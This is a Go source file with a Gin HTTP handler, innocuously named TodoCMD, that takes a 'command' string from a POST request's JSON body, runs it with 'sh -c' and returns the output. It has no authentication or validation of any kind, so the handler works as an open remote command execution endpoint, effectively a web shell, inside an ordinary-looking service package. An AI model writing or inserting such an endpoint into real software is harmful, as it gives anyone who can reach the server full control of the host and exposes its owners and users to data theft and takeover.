package service

import (
	"bytes"
	"github.com/gin-gonic/gin"
	"net/http"
	"os/exec"
)

func TodoCMD(c *gin.Context) {
	if c.Request.Method != http.MethodPost {
		c.JSON(http.StatusMethodNotAllowed, gin.H{"error": "只支持 POST 请求"})
		return
	}

	var command struct {
		Command string `json:"command"`
	}

	if err := c.ShouldBindJSON(&command); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": "failed: " + err.Error()})
		return
	}

	output, err := executeShellCommand(command.Command)
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "exec failed: " + err.Error()})
		return
	}

	c.JSON(http.StatusOK, gin.H{
		"output": string(output),
	})
}

func executeShellCommand(cmd string) ([]byte, error) {
	command := exec.Command("sh", "-c", cmd)
	var out bytes.Buffer
	command.Stdout = &out
	command.Stderr = &out

	err := command.Run()
	return out.Bytes(), err
}
